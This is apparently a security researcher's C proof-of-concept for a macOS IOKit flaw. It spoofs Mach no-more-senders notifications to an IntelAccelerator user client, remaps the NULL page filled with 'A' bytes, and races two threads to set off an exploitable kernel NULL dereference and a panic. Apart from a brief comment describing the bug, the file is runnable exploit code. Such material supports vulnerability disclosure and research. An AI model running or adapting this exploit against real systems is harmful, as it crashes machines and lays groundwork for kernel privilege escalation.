// ianbeer
// clang -o iospoof_with_null iospoof_with_null.c -m32 -framework IOKit -g -pagezero_size 0x0

/*
IOKit doesn't correctly handle spoofed no-more-senders notifications

A spoofed no-more-senders notification leads to a call to ::clientClosed when there actually are still
clients. What happens then depends on the userClient's implementation of clientClosed; in this
particular case (with userclient type 0 of IntelAccelerator) we hit an exploitable NULL deref
(this should panic reading from 414141414141414141 (note that that address had been read from the NULL page.)

I imagine there are *far* more bugs here!
*/

#include <stdio.h>
#include <stdlib.h>

#include <mach/mach.h>
#include <mach/thread_act.h>
#include <mach/vm_map.h>
#include <sys/mman.h>

#include <pthread.h>
#include <unistd.h>

#include <IOKit/IOKitLib.h>

io_connect_t conn = MACH_PORT_NULL;

int start = 0;

struct spoofed_notification {
  mach_msg_header_t header;
  NDR_record_t NDR;
  mach_msg_type_number_t no_senders_count;
};

struct spoofed_notification msg = {0};

void send_message() {
  mach_msg(&msg,
           MACH_SEND_MSG,
           msg.header.msgh_size,
           0,
           MACH_PORT_NULL,
           MACH_MSG_TIMEOUT_NONE,
           MACH_PORT_NULL);
}

void go(void* arg){

  while(start == 0){;}

  usleep(1);

  send_message();
}

int main() {
  kern_return_t err;

  // re map the null page rw
  int var = 0;
  err = vm_deallocate(mach_task_self(), 0x0, 0x1000);
  if (err != KERN_SUCCESS){
    printf("%x\n", err);
  }
  vm_address_t addr = 0;
  err = vm_allocate(mach_task_self(), &addr, 0x1000, 0);
  if (err != KERN_SUCCESS){
    if (err == KERN_INVALID_ADDRESS){
      printf("invalid address\n");
    }
    if (err == KERN_NO_SPACE){
      printf("no space\n");
    }
    printf("%x\n", err);
  }
  char* np = 0;
  for (int i = 0; i < 0x1000; i++){
    np[i] = 'A';
  }


  io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOAccelerator"));
  if (service == MACH_PORT_NULL) {
    printf("can't find service\n");
    return 0;
  }

  IOServiceOpen(service, mach_task_self(), 0, &conn);
  if (conn == MACH_PORT_NULL) {
    printf("can't connect to service\n");
    return 0;
  }

  pthread_t t;
  int arg = 0;
  pthread_create(&t, NULL, (void*) go, (void*) &arg);

  // build the message:
  msg.header.msgh_size = sizeof(struct spoofed_notification);
  msg.header.msgh_local_port = conn;
  msg.header.msgh_remote_port = conn;
  msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_COPY_SEND);
  msg.header.msgh_id = 0106;
  
  msg.no_senders_count = 1000;

  usleep(100000);

  start = 1;

  send_message();

  pthread_join(t, NULL);

  return 0;
}
